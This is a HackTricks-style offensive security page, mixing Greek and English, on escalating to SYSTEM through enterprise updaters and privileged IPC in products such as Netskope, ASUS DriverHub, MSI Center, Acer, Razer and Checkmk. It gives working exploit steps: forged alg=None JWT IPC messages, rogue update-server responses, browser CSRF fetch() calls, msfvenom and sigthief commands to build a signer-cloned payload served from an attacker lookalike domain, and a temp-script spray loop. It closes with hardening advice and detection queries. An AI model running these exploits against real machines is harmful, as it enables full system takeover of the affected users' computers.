# Κατάχρηση Enterprise Auto-Updaters and Privileged IPC (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Αυτή η σελίδα γενικεύει μια κατηγορία Windows local privilege escalation chains που βρέθηκαν σε enterprise endpoint agents και updaters, τα οποία εκθέτουν ένα low-friction IPC surface και ένα privileged update flow. Ένα αντιπροσωπευτικό παράδειγμα είναι το Netskope Client for Windows < R129 (CVE-2025-0309), όπου ένας low-privileged user μπορεί να εξαναγκάσει enrollment σε attacker-controlled server και στη συνέχεια να παραδώσει ένα malicious MSI που εγκαθίσταται από την SYSTEM service.

Κύριες ιδέες που μπορείς να επαναχρησιμοποιήσεις απέναντι σε παρόμοια προϊόντα:
- Abuse ενός privileged service’s localhost IPC για να εξαναγκάσεις re-enrollment ή reconfiguration σε attacker server.
- Υλοποίησε τα update endpoints του vendor, παρέδωσε ένα rogue Trusted Root CA, και δείξε τον updater σε ένα malicious, “signed” package.
- Παράκαμψε weak signer checks (CN allow-lists), optional digest flags, και lax MSI properties.
- Αν το IPC είναι “encrypted”, παράγαγε το key/IV από world-readable machine identifiers που είναι stored in the registry.
- Αν το service περιορίζει callers με image path/process name, κάνε inject μέσα σε ένα allow-listed process ή ξεκίνα ένα suspended και bootstrap το DLL σου μέσω ενός minimal thread-context patch.

---
## 1) Εξαναγκασμός enrollment σε attacker server μέσω localhost IPC

Πολλοί agents ship ένα user-mode UI process που μιλάει σε ένα SYSTEM service over localhost TCP using JSON.

Observed in Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) Κατασκεύασε ένα JWT enrollment token whose claims control the backend host (e.g., AddonUrl). Χρησιμοποίησε alg=None ώστε να μην απαιτείται signature.
2) Στείλε το IPC message invoking the provisioning command with your JWT and tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Η υπηρεσία αρχίζει να χτυπά τον rogue server σου για enrollment/config, π.χ.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Σημειώσεις:
- Αν το caller verification είναι path/name-based, προέρχου την αίτηση από ένα allow-listed vendor binary (βλ. §4).

---
## 2) Hijacking το update channel για να τρέξεις code ως SYSTEM

Μόλις ο client μιλήσει με τον server σου, υλοποίησε τα αναμενόμενα endpoints και κατεύθυνέ τον σε ένα attacker MSI. Τυπική ακολουθία:

1) /v2/config/org/clientconfig → Επέστρεψε JSON config με ένα πολύ σύντομο updater interval, π.χ.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Επιστρέφει ένα PEM CA certificate. Η υπηρεσία το εγκαθιστά στο Local Machine Trusted Root store.
3) /v2/checkupdate → Παρέχει metadata που δείχνουν σε ένα malicious MSI και μια fake version.

Παράκαμψη common checks που εμφανίζονται στην πράξη:
- Signer CN allow-list: η υπηρεσία μπορεί να ελέγχει μόνο αν το Subject CN ισούται με “netSkope Inc” ή “Netskope, Inc.”. Το rogue CA σου μπορεί να εκδώσει ένα leaf με αυτό το CN και να υπογράψει το MSI.
- CERT_DIGEST property: συμπερίλαβε ένα benign MSI property με όνομα CERT_DIGEST. Δεν επιβάλλεται έλεγχος κατά την εγκατάσταση.
- Optional digest enforcement: ένα config flag (π.χ. check_msi_digest=false) απενεργοποιεί το επιπλέον cryptographic validation.

Αποτέλεσμα: η υπηρεσία SYSTEM εγκαθιστά το MSI σου από
C:\ProgramData\Netskope\stAgent\data\*.msi
εκτελώντας arbitrary code ως NT AUTHORITY\SYSTEM.

Patch-bypass lesson: αν ένας vendor απαντήσει κάνοντας allow-list ένα μικρό σύνολο από “trusted” domains αντί να αυθεντικοποιεί cryptographically το update source, ψάξε για vendor-owned redirectors ή reverse proxies που εξακολουθούν να σου επιτρέπουν να κατευθύνεις την traffic. Στην περίπτωση της Netskope, δημόσια follow-up research έδειξε ότι ένα R129-era allow-list μπορούσε ακόμη να γίνει abused μέσω `rproxy.goskope.com`, το οποίο proxied attacker-controlled Azure App Service content. Θεώρησε τα hostname allow-lists ως speed bump, όχι ως trust boundary.

---
## 3) Forging encrypted IPC requests (when present)

Από το R127, η Netskope τύλιγε το IPC JSON σε ένα encryptData field που μοιάζει με Base64. Η reverse analysis έδειξε AES με key/IV παραγόμενα από registry values που είναι readable από οποιονδήποτε user:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Οι attackers μπορούν να αναπαράγουν την encryption και να στείλουν valid encrypted commands από standard user. General tip: αν ένας agent ξαφνικά “encrypts” το IPC του, ψάξε για device IDs, product GUIDs, install IDs κάτω από HKLM ως υλικό.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Ορισμένες υπηρεσίες προσπαθούν να authenticate τον peer επιλύοντας το PID της TCP connection και συγκρίνοντας το image path/name με allow-listed vendor binaries που βρίσκονται κάτω από το Program Files (π.χ., stagentui.exe, bwansvc.exe, epdlp.exe).

Δύο πρακτικά bypasses:
- DLL injection σε ένα allow-listed process (π.χ., nsdiag.exe) και proxy IPC από μέσα του.
- Spawn ένα allow-listed binary suspended και bootstrap το proxy DLL σου χωρίς CreateRemoteThread (δες §5) ώστε να ικανοποιήσεις τους driver-enforced tamper rules.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Products συχνά συνοδεύονται από έναν minifilter/OB callbacks driver (π.χ., Stadrv) για να αφαιρούν dangerous rights από handles προς protected processes:
- Process: αφαιρεί PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: περιορίζει σε THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Ένα reliable user-mode loader που σέβεται αυτούς τους περιορισμούς:
1) CreateProcess ενός vendor binary με CREATE_SUSPENDED.
2) Πάρε handles που επιτρέπονται ακόμα: PROCESS_VM_WRITE | PROCESS_VM_OPERATION στο process, και ένα thread handle με THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (ή μόνο THREAD_RESUME αν κάνεις patch code σε γνωστό RIP).
3) Αντικατάστησε το ntdll!NtContinue (ή άλλο early, guaranteed-mapped thunk) με ένα μικρό stub που καλεί LoadLibraryW στο DLL path σου, και μετά γυρίζει πίσω.
4) ResumeThread για να ενεργοποιήσεις το stub σου in-process, φορτώνοντας το DLL σου.

Επειδή δεν χρησιμοποίησες PROCESS_CREATE_THREAD ή PROCESS_SUSPEND_RESUME σε ήδη-protected process (το δημιούργησες εσύ), η policy του driver ικανοποιείται.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automates ένα rogue CA, malicious MSI signing, και σερβίρει τα απαραίτητα endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope is a custom IPC client που δημιουργεί arbitrary (optionally AES-encrypted) IPC messages και περιλαμβάνει το suspended-process injection ώστε να προέρχεται από ένα allow-listed binary.

## 7) Fast triage workflow for unknown updater/IPC surfaces

Όταν αντιμετωπίζεις ένα νέο endpoint agent ή μια motherboard “helper” suite, ένα γρήγορο workflow συνήθως αρκεί για να δεις αν κοιτάς ένα πολλά υποσχόμενο privesc target:

1) Κατέγραψε loopback listeners και αντιστοίχισέ τα πίσω σε vendor processes:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Απαρίθμησε πιθανούς named pipes:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Εξόρυξε δεδομένα δρομολόγησης με υποστήριξη registry που χρησιμοποιούνται από plugin-based IPC servers:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Εξαγάγετε πρώτα τα endpoint names, τα JSON keys και τα command IDs από το user-mode client. Τα packed Electron/.NET frontends συχνά leak το πλήρες schema:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Αναζητήστε το πραγματικό trust predicate, όχι απλώς το code path που τελικά εκκινεί τη διεργασία:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Patterns worth prioritizing:
- `CryptQueryObject`/certificate parsing without `WinVerifyTrust` usually means “certificate exists” was treated as “certificate is trusted”, enabling certificate cloning or other fake-signer tricks.
- Substring/suffix checks over `Origin`, `Referer`, download URLs, process names, or signer CNs are not authentication. `contains(".vendor.com")` is usually exploitable with attacker-controlled lookalike domains.
- If the low-privileged GUI decides “the file is trusted” and the SYSTEM broker merely consumes that result, patching or reimplementing the client-side DLL/JS often bypasses the boundary entirely (Razer-style split validation).
- If the broker copies a payload to `%TEMP%`/`C:\Windows\Temp` and then validates or schedules it from that path, immediately test for TOCTOU replacement windows and for sibling plugin modules that expose alternate `ExecuteTask()` wrappers with weaker checks.

For named-pipe-heavy targets, PipeViewer is a quick way to spot weak DACLs and remotely reachable pipes before you start reversing the protocol in depth.

If the target authenticates callers only by PID, image path, or process name, treat that as a speed bump rather than a boundary: injecting into the legitimate client, or making the connection from an allow-listed process, is often enough to satisfy the server’s checks. For named pipes specifically, [this page about client impersonation and pipe abuse](named-pipe-client-impersonation.md) covers the primitive in more depth.

---
## 8) Modular add-in brokers authenticated only by vendor signatures (Lenovo Vantage pattern)

A newer variation worth hunting is the **signed-client RPC broker**: a low-privileged Lenovo-signed desktop process talks to a SYSTEM service, and the service routes JSON commands into a set of XML-described add-ins under `%ProgramData%`. Once code execution is achieved **inside any accepted signed client**, every `runas="system"` contract becomes part of your attack surface.

High-value primitives observed in Lenovo Vantage research:
- **Trusting the caller because it is signed by the vendor**: researchers reached an authenticated context by copying a Lenovo-signed EXE to a writable directory and satisfying a DLL side-load (`profapi.dll`) so arbitrary code ran inside a client the service already trusted.
- **Manifest-driven attack surface discovery**: add-ins are declared under `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; several contracts run as `SYSTEM`, so enumerating those manifests often reveals the real privileged verbs faster than reversing the broker itself.
- **Per-command bugs behind the authenticated channel**: once inside the trusted client, public research found path-traversal + race conditions in update/install verbs, raw-SQL abuse in privileged settings databases, and substring-based registry path checks that enabled writes outside the intended hive.

Useful recon on a target:
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
Πρακτικό συμπέρασμα: κάθε φορά που μια helper suite εκθέτει έναν broker που πρώτα αυθεντικοποιεί το **caller process** και μόνο μετά κάνει dispatch σε δεκάδες plugin/add-in commands, μην σταματάς αφού παρακάμψεις τον front-door trust check. Dump τον manifest/contract table και fuzz κάθε high-privilege verb ανεξάρτητα· το authenticated channel συνήθως κρύβει αρκετά second-stage bugs.

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

Το DriverHub ships ένα user-mode HTTP service (ADU.exe) στο 127.0.0.1:53000 που περιμένει browser calls που προέρχονται από https://driverhub.asus.com. Το origin filter απλώς κάνει `string_contains(".asus.com")` πάνω στο Origin header και πάνω σε download URLs που εκτίθενται από `/asus/v1.0/*`. Έτσι, οποιοδήποτε attacker-controlled host όπως `https://driverhub.asus.com.attacker.tld` περνάει τον έλεγχο και μπορεί να στέλνει state-changing requests από JavaScript. Δες [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) για επιπλέον bypass patterns.

Practical flow:
1) Καταχώρησε ένα domain που ενσωματώνει `.asus.com` και φιλοξένησε εκεί μια malicious webpage.
2) Χρησιμοποίησε `fetch` ή XHR για να καλέσεις ένα privileged endpoint (π.χ. `Reboot`, `UpdateApp`) στο `http://127.0.0.1:53000`.
3) Στείλε το JSON body που αναμένει ο handler – το packed frontend JS δείχνει το schema παρακάτω.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Ακόμα και το PowerShell CLI που φαίνεται παρακάτω πετυχαίνει όταν το Origin header spoofed στο trusted value:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1-click (or 0-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` κατεβάζει arbitrary executables που ορίζονται στο JSON body και τα κάνει cache στο `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Η validation του download URL ξαναχρησιμοποιεί την ίδια substring logic, οπότε το `http://updates.asus.com.attacker.tld:8000/payload.exe` γίνεται accepted. Μετά το download, το ADU.exe απλώς ελέγχει ότι το PE περιέχει signature και ότι το Subject string ταιριάζει με ASUS πριν το εκτελέσει – χωρίς `WinVerifyTrust`, χωρίς chain validation.

Για να weaponize το flow:
1) Create a payload (e.g., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clone ASUS’s signer into it (e.g., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Host `pwn.exe` on a `.asus.com` lookalike domain and trigger UpdateApp via the browser CSRF above.

Επειδή και τα δύο, το Origin και τα URL filters, βασίζονται σε substring, και ο signer check συγκρίνει μόνο strings, το DriverHub τραβά και εκτελεί το attacker binary μέσα από το elevated context του.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

Το SYSTEM service του MSI Center εκθέτει ένα TCP protocol όπου κάθε frame είναι `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Το core component (Component ID `0f 27 00 00`) shipάρει `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Το handler του:
1) Αντιγράφει το supplied executable στο `C:\Windows\Temp\MSI Center SDK.exe`.
2) Επαληθεύει το signature via `CS_CommonAPI.EX_CA::Verify` (certificate subject must equal “MICRO-STAR INTERNATIONAL, CO., LTD.” and `WinVerifyTrust` succeeds).
3) Δημιουργεί ένα scheduled task που τρέχει το temp file ως SYSTEM με attacker-controlled arguments.

Το copied file δεν είναι locked ανάμεσα στο verification και το `ExecuteTask()`. Ένας attacker μπορεί να:
- Send Frame A pointing to a legitimate MSI-signed binary (guarantees the signature check passes and the task is queued).
- Race it with repeated Frame B messages that point to a malicious payload, overwriting `MSI Center SDK.exe` just after verification completes.

Όταν το scheduler fireάρει, εκτελεί το overwritten payload υπό SYSTEM παρότι έχει validάρει το original file. Reliable exploitation χρησιμοποιεί δύο goroutines/threads που spamάρουν `CMD_AutoUpdateSDK` μέχρι να κερδηθεί το TOCTOU window.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Every plugin/DLL loaded by `MSI.CentralServer.exe` λαμβάνει ένα Component ID stored under `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Τα πρώτα 4 bytes ενός frame επιλέγουν αυτό το component, επιτρέποντας στους attackers να κάνουν route commands σε arbitrary modules.
- Plugins can define their own task runners. `Support\API_Support.dll` exposes `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` and directly calls `API_Support.EX_Task::ExecuteTask()` με **no signature validation** – any local user can point it at `C:\Users\<user>\Desktop\payload.exe` and get SYSTEM execution deterministically.
- Sniffing loopback with Wireshark or instrumenting the .NET binaries in dnSpy quickly reveals the Component ↔ command mapping; custom Go/ Python clients can then replay frames.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) exposes `\\.\pipe\treadstone_service_LightMode`, and its discretionary ACL allows remote clients (e.g., `\\TARGET\pipe\treadstone_service_LightMode`). Sending command ID `7` with a file path invokes the service’s process-spawning routine.
- The client library serializes a magic terminator byte (113) along with args. Dynamic instrumentation with Frida/`TsDotNetLib` (see [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) for instrumentation tips) shows that the native handler maps this value to a `SECURITY_IMPERSONATION_LEVEL` and integrity SID before calling `CreateProcessAsUser`.
- Swapping 113 (`0x71`) for 114 (`0x72`) drops into the generic branch that keeps the full SYSTEM token and sets a high-integrity SID (`S-1-16-12288`). The spawned binary therefore runs as unrestricted SYSTEM, both locally and cross-machine.
- Combine that with the exposed installer flag (`Setup.exe -nocheck`) to stand up ACC even on lab VMs and exercise the pipe without vendor hardware.

These IPC bugs highlight why localhost services must enforce mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) and why every module’s “run arbitrary binary” helper must share the same signer verifications.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4 added another useful pattern to this family: a low-privileged user can ask a COM helper to launch a process through `RzUtility.Elevator`, while the trust decision is delegated to a user-mode DLL (`simple_service.dll`) rather than being enforced robustly inside the privileged boundary.

Observed exploitation path:
- Instantiate the COM object `RzUtility.Elevator`.
- Call `LaunchProcessNoWait(<path>, "", 1)` to request an elevated launch.
- In the public PoC, the PE-signature gate inside `simple_service.dll` is patched out before issuing the request, allowing an arbitrary attacker-chosen executable to be launched.

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Γενικό συμπέρασμα: όταν κάνετε reverse “helper” suites, μην σταματάτε σε localhost TCP ή named pipes. Ελέγξτε για COM classes με ονόματα όπως `Elevator`, `Launcher`, `Updater`, ή `Utility`, έπειτα επαληθεύστε αν η privileged service όντως validates το target binary itself ή απλώς εμπιστεύεται ένα αποτέλεσμα που υπολογίζεται από ένα patchable user-mode client DLL. Αυτό το pattern generalizes πέρα από το Razer: οποιοδήποτε split design όπου το high-privilege broker καταναλώνει μια allow/deny απόφαση από το low-privilege side είναι υποψήφια privesc surface.


---
## Predictable temp script execution during MSI repair (Checkmk Agent / CVE-2024-0670)

Κάποιοι Windows agents εξακολουθούν να υλοποιούν privileged actions γράφοντας ένα προσωρινό `.cmd` στο `C:\Windows\Temp` και εκτελώντας το ως `SYSTEM`. Αν το filename είναι predictable και η service δεν αναδημιουργεί με ασφάλεια υπάρχοντα αρχεία, ένας low-privileged user μπορεί να pre-create το μελλοντικό temp file ως **read-only** και να κάνει το privileged process να εκτελέσει attacker-controlled content αντί για το δικό του script.

Παρατηρήθηκε σε vulnerable Checkmk Agent builds:
- temp pattern: `cmk_all_<PID>_1.cmd`
- affected branches: `2.0.0`, `2.1.0`, `2.2.0`
- trigger: MSI **repair** του cached agent package

Practical workflow:
1. Estimate a realistic PID range από τα current process IDs ή το running agent PID.
2. Γράψτε ένα σύντομο **ASCII** `.cmd` payload (`Set-Content -Encoding Ascii` ή `cmd.exe` redirection; αποφεύγετε UTF-16 PowerShell output για batch files).
3. Spray `C:\Windows\Temp\cmk_all_<PID>_1.cmd` across το candidate range και mark each file read-only.
4. Trigger a repair of the cached MSI ώστε η privileged service να προσπαθήσει να regenerate και μετά να execute το temp script.
```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```
Εάν το ευάλωτο προϊόν έχει εγκατασταθεί με Windows Installer, χαρτογραφήστε το τυχαία εμφανιζόμενο cached MSI στο `C:\Windows\Installer` πίσω στο όνομα του προϊόντος του πριν ενεργοποιήσετε το repair:
```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
ForEach-Object {
$p = Get-ItemProperty $_.PSPath
[PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
} | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```
Operational notes:
- `qwinsta` είναι χρήσιμο όταν το `msiexec /fa` αποτυγχάνει από ένα non-interactive WinRM shell και χρειάζεσαι να καταλάβεις αν μια υπάρχουσα desktop/disconnected session μπορεί να ενεργοποιήσει σωστά το repair.
- Αυτό το pattern γενικεύεται και σε άλλους endpoint agents και updaters που **stage temp scripts σε world-writable locations και αργότερα τα εκτελούν ως SYSTEM**. Κάνε test για predictable names, missing exclusive create semantics, και repair/update flows που μπορούν να ενεργοποιηθούν on demand.

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

Between June 2025 and December 2025, attackers who compromised the hosting infrastructure behind the Notepad++ update flow selectively served malicious manifests to chosen victims. Older WinGUp-based updaters did not fully verify update authenticity, so a hostile XML response could redirect clients to attacker-controlled URLs. Because the client accepted HTTPS content without enforcing both a trusted certificate chain and a valid PE signature on the downloaded installer, victims fetched and executed a trojanized NSIS `update.exe`.

Operational flow (no local exploit required):
1. **Infrastructure interception**: compromise CDN/hosting and answer update checks with attacker metadata pointing at a malicious download URL.
2. **Trojanized NSIS**: the installer fetches/executes a payload and abuses two execution chains:
- **Bring-your-own signed binary + sideload**: bundle the signed Bitdefender `BluetoothService.exe` and drop a malicious `log.dll` in its search path. When the signed binary runs, Windows sideloads `log.dll`, which decrypts and reflectively loads the Chrysalis backdoor (Warbird-protected + API hashing to hinder static detection).
- **Scripted shellcode injection**: NSIS executes a compiled Lua script that uses Win32 APIs (e.g., `EnumWindowStationsW`) to inject shellcode and stage Cobalt Strike Beacon.

Hardening/detection takeaways for any auto-updater:
- Enforce **certificate + signature verification** of the downloaded installer (pin vendor signer, reject mismatched CN/chain) and sign the update manifest itself (e.g., XMLDSig). Block manifest-controlled redirects unless validated.
- Treat **BYO signed binary sideloading** as a post-download detection pivot: alert when a signed vendor EXE loads a DLL name from outside its canonical install path (e.g., Bitdefender loading `log.dll` from Temp/Downloads) and when an updater drops/executes installers from temp with non-vendor signatures.
- Monitor **malware-specific artifacts** observed in this chain (useful as generic pivots): mutex `Global\Jdhfv_1.0.1`, anomalous `gup.exe` writes to `%TEMP%`, and Lua-driven shellcode injection stages.
- Notepad++ responded by strengthening WinGUp in v8.8.9 and later: the returned XML is now signed (XMLDSig), and newer builds enforce certificate + signature verification of the downloaded installer instead of trusting the transport alone.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> εκκινεί έναν μη-Notepad++ installer</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Αυτά τα patterns γενικεύονται σε οποιοδήποτε updater που δέχεται unsigned manifests ή αποτυγχάνει να κάνει pin τους installer signers—network hijack + malicious installer + BYO-signed sideloading καταλήγει σε remote code execution υπό το πρόσχημα «trusted» updates.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [SEC Consult – Local Privilege Escalation via writable files in Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [Checkmk Werk #16361 – Privilege escalation in Windows agent](https://checkmk.com/werk/16361)
- [RunasCs](https://github.com/antonioCoco/RunasCs)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Atredis – Uncovering Privilege Escalation Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
